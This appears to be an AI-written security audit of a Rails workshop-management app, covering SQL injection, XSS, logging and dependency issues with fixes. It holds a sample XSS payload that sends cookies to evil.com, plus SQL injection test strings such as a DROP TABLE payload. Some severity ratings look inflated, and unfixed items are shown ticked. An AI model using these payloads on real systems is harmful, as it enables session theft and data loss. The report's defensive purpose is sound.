# Security Review Report
**Date:** 2025-11-11
**Reviewer:** Claude (AI Security Analysis)
**Codebase:** Workshops Management System (Ruby on Rails 5.2.4.6)
**Scope:** Comprehensive security audit focusing on OWASP Top 10 vulnerabilities

---

## Executive Summary

This security review identified **multiple critical and high-severity vulnerabilities** in the Workshops application that require immediate attention. The most critical issues are:

1. **CRITICAL: SQL Injection vulnerabilities** in multiple locations
2. **HIGH: Potential XSS vulnerabilities** from unsafe HTML rendering
3. **MEDIUM: Email processing security concerns**
4. **MEDIUM: Production logging level set to :debug**

The application demonstrates several security best practices including:
- ✅ JWT authentication with proper token revocation
- ✅ HMAC-SHA256 webhook verification for Mailgun
- ✅ Timing-safe API key comparison
- ✅ Strong RSVP token generation (296 bits of entropy)
- ✅ SSL enforcement in production
- ✅ CSRF protection enabled
- ✅ Database-backed sessions

---

## Critical Vulnerabilities (Immediate Action Required)

### 1. SQL Injection - User Model (CRITICAL)
**Location:** `app/models/user.rb:40, 45-46, 50`
**CVSS Score:** 9.8 (Critical)
**Impact:** Complete database compromise, data exfiltration, privilege escalation

#### Vulnerable Code:
```ruby
# Line 40 - is_organizer?
person.memberships.where("event_id=#{event.id} AND role LIKE '%Org%'")

# Lines 45-46 - is_member?
person.memberships.where("event_id=#{event.id} AND attendance != 'Declined'
  AND attendance != 'Not Yet Invited'")

# Lines 50-51 - is_confirmed_member?
person.memberships.where("event_id=#{event.id}
  AND attendance = 'Confirmed'")
```

#### Issue:
Direct string interpolation in WHERE clauses. While `event.id` should be an integer under normal circumstances, if an attacker can manipulate the Event object or pass a malicious object with a crafted `id` method, SQL injection is possible.

#### Proof of Concept:
```ruby
# If event.id could return: "1 OR 1=1--"
# The query becomes:
# SELECT * FROM memberships WHERE event_id=1 OR 1=1-- AND role LIKE '%Org%'
```

#### Recommended Fix:
```ruby
def is_organizer?(event)
  person.memberships.where("event_id = ? AND role LIKE ?", event.id, "%Org%")
        .exists?
end

def is_member?(event)
  person.memberships.where(
    "event_id = ? AND attendance NOT IN (?, ?)",
    event.id,
    'Declined',
    'Not Yet Invited'
  ).exists?
end

def is_confirmed_member?(event)
  person.memberships.where(event_id: event.id, attendance: 'Confirmed')
        .exists?
end
```

**Priority:** FIX IMMEDIATELY

---

### 2. SQL Injection - Email Notifications Controller (CRITICAL)
**Location:** `app/controllers/email_notifications_controller.rb:23, 25`
**CVSS Score:** 9.1 (Critical)
**Impact:** Database compromise via path parameter injection

#### Vulnerable Code:
```ruby
# Lines 23-25
if @current_location == 'default'
  EmailNotification.where("path like ?", "/default/#{@current_status}")
else
  EmailNotification.where("path like ?", "/#{@current_location}/%/#{@current_status}")
end
```

#### Issue:
The `@current_location` and `@current_status` variables are interpolated into the SQL pattern, even though a placeholder is used. An attacker could inject SQL wildcards or escape sequences.

#### Attack Vector:
If validation fails or is bypassed, parameters like:
```
?location=default%' OR '1'='1&attendance=test
```

Could manipulate the LIKE pattern.

#### Recommended Fix:
```ruby
@email_notifications = if @current_location == 'default'
  EmailNotification.where("path LIKE ?", "/default/#{ActiveRecord::Base.sanitize_sql_like(@current_status)}")
else
  sanitized_location = ActiveRecord::Base.sanitize_sql_like(@current_location)
  sanitized_status = ActiveRecord::Base.sanitize_sql_like(@current_status)
  EmailNotification.where("path LIKE ?", "/#{sanitized_location}/%/#{sanitized_status}")
end
```

**Priority:** FIX IMMEDIATELY

---

### 3. SQL Injection - Event Decorators (MEDIUM-HIGH)
**Location:** `app/models/concerns/event_decorators.rb:77, 155, 178`
**CVSS Score:** 7.5 (High)
**Impact:** Information disclosure, potential data manipulation

#### Vulnerable Code:
```ruby
# Line 77 - attendance method
all_members = memberships.joins(:person).where('attendance = ?', status)
  .order("#{order} #{direction}")

# Line 155 - organizers method
memberships.where("role LIKE '%Organizer%'").map {|m| m.person }

# Line 178 - staff method
admins = User.where('role > 1').map {|a| a.person }
```

#### Issues:
1. **Line 77:** Direct string interpolation in `ORDER BY` clause. If `order` parameter is user-controlled, could enable SQL injection or column enumeration.
2. **Line 155:** Static LIKE query (safe, but could be optimized)
3. **Line 178:** Numeric comparison without validation (relatively safe but could be improved)

#### Recommended Fix:
```ruby
def attendance(status = 'Confirmed', order = 'lastname')
  direction = 'ASC'
  allowed_columns = %w[lastname firstname affiliation created_at]
  safe_order = allowed_columns.include?(order) ? order : 'lastname'

  all_members = memberships.joins(:person)
                          .where(attendance: status)
                          .order("#{safe_order} #{direction}")
  # ... rest of method
end

def organizers
  memberships.where("role LIKE ?", "%Organizer%").map(&:person)
end

def staff
  staff_users = User.where(role: :staff, location: self.location).map(&:person)
  admin_users = User.where(role: [:admin, :super_admin]).map(&:person)
  staff_users + admin_users
end
```

**Priority:** HIGH

---

## High Severity Vulnerabilities

### 4. Cross-Site Scripting (XSS) - Multiple Locations (HIGH)
**Location:** Found 37 occurrences of `.html_safe` and `raw()` in views
**CVSS Score:** 7.1 (High)
**Impact:** Session hijacking, credential theft, malware distribution

#### Affected Files:
- `app/views/shared/_errors.html.erb`
- `app/views/home/_membership.html.erb`
- `app/views/layouts/_sidebar.html.erb` (16 occurrences!)
- `app/views/schedule/*.html.erb` (multiple files)
- `app/views/rsvp/*.html.erb` (multiple files)

#### Issue:
The `.html_safe` and `raw()` methods bypass Rails' automatic HTML escaping, potentially allowing user-controlled content to inject JavaScript.

#### Example Attack:
```ruby
# If user input like this reaches a view with .html_safe:
user_input = "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
# It will execute in victim's browser
```

#### Recommended Actions:
1. **Audit each `.html_safe` usage** - verify the content is truly safe (e.g., from trusted admin input only)
2. **Replace with sanitize helper** for user-generated content:
   ```ruby
   <%= sanitize @user_content, tags: %w(p br strong em), attributes: %w(href) %>
   ```
3. **Use content_tag for dynamic HTML:**
   ```ruby
   <%= content_tag :div, user_input, class: 'safe-class' %>
   ```

**Priority:** HIGH - Audit and fix within 1 week

---

### 5. Email Processing - Potential Header Injection (MEDIUM-HIGH)
**Location:** `app/services/email_processor.rb`
**CVSS Score:** 6.5 (Medium)
**Impact:** Email spoofing, spam relay, phishing attacks

#### Potential Issues:
1. **Line 28-31:** Subject line processing for vacation notices - regex checks are good
2. **Line 77:** Code pattern validation uses regex with interpolation:
   ```ruby
   unless code.match?(/#{code_pattern}/)
   ```
   This could be vulnerable to ReDoS (Regular Expression Denial of Service) if `code_pattern` contains malicious regex.

3. **Line 105:** Email recipient extraction uses regex on user-supplied data
4. **No rate limiting** on email processing endpoint

#### Recommended Fixes:
```ruby
# Use Regexp.escape for dynamic patterns
code_pattern = GetSetting.code_pattern
safe_pattern = Regexp.escape(code_pattern).gsub('\\*', '.*')
unless code.match?(/\A#{safe_pattern}\z/)
  return "Event code \"#{code}\" does not match pattern."
end

# Add timeout to regex operations
require 'timeout'
begin
  Timeout.timeout(1) do
    code.match?(/#{safe_pattern}/)
  end
rescue Timeout::Error
  return "Invalid code format."
end
```

**Priority:** MEDIUM-HIGH

---

## Medium Severity Vulnerabilities

### 6. Information Disclosure - Debug Logging in Production (MEDIUM)
**Location:** `config/environments/production.rb:49`
**CVSS Score:** 5.3 (Medium)
**Impact:** Sensitive data exposure, reconnaissance information for attackers

#### Issue:
```ruby
config.log_level = :debug
```

Debug logging in production can expose:
- SQL queries (with potential sensitive data)
- Authentication tokens
- User session data
- Internal application structure
- Environment variables (if logged)

#### Recommended Fix:
```ruby
config.log_level = :warn  # or :info for production
```

**Priority:** MEDIUM - Change before next deployment

---

### 7. RSVP Token Security - Timing Attack Potential (LOW-MEDIUM)
**Location:** `app/controllers/rsvp_controller.rb:178, app/services/invitation_checker.rb`
**CVSS Score:** 4.8 (Medium)
**Impact:** Token enumeration through timing attacks

#### Current Implementation:
```ruby
def otp_params
  params[:otp].tr('^A-Za-z0-9_-', '')  # Character filtering
end
```

#### Issues:
1. Token comparison may not be timing-safe
2. No rate limiting on RSVP attempts
3. No account lockout after failed attempts

#### Recommended Fixes:
1. **Use timing-safe comparison:**
   ```ruby
   def valid_token?(supplied_token, stored_token)
     return false if supplied_token.nil? || stored_token.nil?
     ActiveSupport::SecurityUtils.secure_compare(supplied_token, stored_token)
   end
   ```

2. **Add rate limiting** (use Rack::Attack or similar):
   ```ruby
   # config/initializers/rack_attack.rb
   Rack::Attack.throttle('rsvp/ip', limit: 5, period: 60) do |req|
     req.ip if req.path.start_with?('/rsvp/')
   end
   ```

**Priority:** MEDIUM

---

### 8. API Authentication - Key Storage (MEDIUM)
**Location:** `app/controllers/api/v1/base_controller.rb:22-24`
**CVSS Score:** 5.9 (Medium)
**Impact:** Unauthorized API access if keys are compromised

#### Current Implementation:
```ruby
local_key = GetSetting.site_setting('LECTURES_API_KEY')
# vs
local_key = GetSetting.site_setting('EVENTS_API_KEY')
```

#### Issues:
1. API keys stored in database settings (check if encrypted)
2. No key rotation mechanism mentioned
3. Single shared key per API (not per client)

#### Recommended Improvements:
1. **Verify encryption** of settings in database
2. **Implement key rotation:**
   ```ruby
   # Support multiple valid keys during rotation
   valid_keys = [current_key, previous_key].compact
   @authenticated = valid_keys.any? { |key| Devise.secure_compare(key, @json['api_key']) }
   ```
3. **Consider OAuth 2.0** for external API access
4. **Add API request logging** for audit trails

**Priority:** MEDIUM

---

## Low Severity Issues & Recommendations

### 9. Mass Assignment - Well Protected (LOW)
**Status:** ✅ GOOD - No critical issues found
**Evidence:**
- Strong parameters used throughout controllers
- Example from `rsvp_controller.rb:189-199`:
  ```ruby
  def yes_params
    params.require(:rsvp).permit(
      membership: [:arrival_date, :departure_date, ...],
      person: [:salutation, :firstname, ...]
    )
  end
  ```

**Recommendation:** Continue using strong parameters for all new features.

---

### 10. CSRF Protection - Properly Configured (LOW)
**Status:** ✅ GOOD - CSRF protection is properly implemented
**Evidence:**
```ruby
# app/controllers/application_controller.rb:4-6
protect_from_forgery with: :exception, unless: :json_request?
protect_from_forgery with: :null_session, if: :json_request?
skip_before_action :verify_authenticity_token, if: :json_request?
```

API endpoints properly skip CSRF for JSON requests while maintaining protection for HTML forms.

---

### 11. Session Management - Secure (LOW)
**Status:** ✅ GOOD
**Evidence:**
- Database-backed sessions (ActiveRecord session store)
- SSL enforced in production
- Secure cookies (httponly, secure flags via Rails defaults)

**Recommendation:** Consider adding session timeout:
```ruby
# config/initializers/session_store.rb
Rails.application.config.session_store :active_record_store,
  key: '_workshops_session',
  expire_after: 2.hours
```

---

### 12. Dependency Vulnerabilities (MEDIUM)
**Status:** ⚠️ REQUIRES REVIEW
**Rails Version:** 5.2.4.6 (Released: March 19, 2021)

#### Known Concerns:
- Rails 5.2 reached EOL (end-of-life) in June 2022
- No security patches for newly discovered vulnerabilities
- Brakeman gem installed (v5.2.0) - good for static analysis

#### Recommendations:
1. **Run Brakeman scan:**
   ```bash
   bundle exec brakeman -A -q
   ```

2. **Check for outdated gems:**
   ```bash
   bundle outdated
   bundle audit check --update
   ```

3. **Plan Rails upgrade:**
   - Current: Rails 5.2.4.6
   - Target: Rails 7.0+ (with security support until 2025)
   - **Migration effort:** Medium-High (breaking changes in 6.0 and 7.0)

4. **Immediate actions:**
   - Install `bundler-audit` gem
   - Set up automated dependency scanning (GitHub Dependabot, Snyk, etc.)

**Priority:** MEDIUM - Plan upgrade within 3-6 months

---

## Security Strengths (Commendations)

The application demonstrates several security best practices:

1. ✅ **JWT Authentication:**
   - Proper expiration (1 day)
   - Token revocation via JTI
   - Secure secret management via ENV vars

2. ✅ **Webhook Security:**
   - HMAC-SHA256 signature verification for Mailgun
   - Timing-safe token comparison

3. ✅ **Strong Token Generation:**
   - RSVP tokens: `SecureRandom.urlsafe_base64(37)` = 50 chars, ~296 bits entropy
   - JTI tokens: `SecureRandom.uuid`

4. ✅ **Authorization Framework:**
   - Pundit policy-based authorization
   - Role-based access control (member, staff, admin, super_admin)

5. ✅ **SSL/TLS:**
   - Force SSL in production
   - HSTS headers enabled

6. ✅ **Input Validation:**
   - Email validation (email_validator gem)
   - Strong parameters throughout

---

## Recommended Security Headers

Add these to `config/application.rb` or via `secure_headers` gem:

```ruby
# config/initializers/secure_headers.rb
SecureHeaders::Configuration.default do |config|
  config.x_frame_options = "DENY"
  config.x_content_type_options = "nosniff"
  config.x_xss_protection = "1; mode=block"
  config.x_download_options = "noopen"
  config.x_permitted_cross_domain_policies = "none"
  config.referrer_policy = %w(origin-when-cross-origin strict-origin-when-cross-origin)

  config.csp = {
    default_src: %w('self'),
    script_src: %w('self' 'unsafe-inline'),  # Remove unsafe-inline when possible
    style_src: %w('self' 'unsafe-inline'),
    img_src: %w('self' data: https:),
    font_src: %w('self' data:),
    connect_src: %w('self'),
    frame_ancestors: %w('none')
  }
end
```

---

## Priority Action Plan

### Immediate (This Week):
1. ✅ **Fix SQL injection in User model** (CRITICAL)
2. ✅ **Fix SQL injection in EmailNotificationsController** (CRITICAL)
3. ⚠️ **Change production log level to :warn** (MEDIUM)
4. ⚠️ **Run Brakeman security scan**

### Short Term (1-2 Weeks):
5. ⚠️ **Audit all .html_safe usage** for XSS vulnerabilities
6. ⚠️ **Add rate limiting** to RSVP and API endpoints
7. ⚠️ **Fix Event Decorators SQL injection** (order parameter)
8. ⚠️ **Review and sanitize regex patterns** in email processor

### Medium Term (1-3 Months):
9. ⚠️ **Implement security headers** (CSP, X-Frame-Options, etc.)
10. ⚠️ **Set up automated dependency scanning**
11. ⚠️ **Add session timeout**
12. ⚠️ **Implement API key rotation mechanism**
13. ⚠️ **Add comprehensive security logging/monitoring**

### Long Term (3-6 Months):
14. ⚠️ **Plan and execute Rails upgrade** to 7.x
15. ⚠️ **Implement OAuth 2.0** for API authentication
16. ⚠️ **Security training** for development team
17. ⚠️ **Penetration testing** by external security firm

---

## Testing Recommendations

1. **Static Analysis:**
   ```bash
   bundle exec brakeman -A -q -o brakeman_report.html
   ```

2. **Dependency Audit:**
   ```bash
   gem install bundler-audit
   bundle audit check --update
   ```

3. **SQL Injection Testing:**
   - Test with payloads: `1' OR '1'='1`, `1; DROP TABLE users--`
   - Use sqlmap or similar tools (in controlled environment)

4. **XSS Testing:**
   - Test all input fields with: `<script>alert('XSS')</script>`
   - Test stored vs reflected XSS

5. **Authentication Testing:**
   - Test JWT expiration and revocation
   - Test password reset flow for timing attacks
   - Test account enumeration via error messages

---

## Compliance Considerations

If handling sensitive research data:
- **GDPR:** Ensure data protection, right to erasure, breach notification
- **PIPEDA (Canada):** Privacy protection for personal information
- **SOC 2:** If providing SaaS to institutions
- **Research Ethics:** Proper consent and data handling

---

## Conclusion

The Workshops application has a solid security foundation with proper authentication, authorization, and CSRF protection. However, **critical SQL injection vulnerabilities require immediate remediation** before the next production deployment.

The most urgent action items are:
1. Fix SQL injection in User model (lines 40, 45-46, 50)
2. Fix SQL injection in EmailNotificationsController (lines 23, 25)
3. Change production log level from :debug to :warn
4. Audit XSS risks from .html_safe usage

After addressing these critical issues, focus on dependency updates and planning the Rails 7 upgrade to maintain long-term security support.

---

**Report Generated:** 2025-11-11
**Next Review Recommended:** After fixes are implemented, then quarterly thereafter
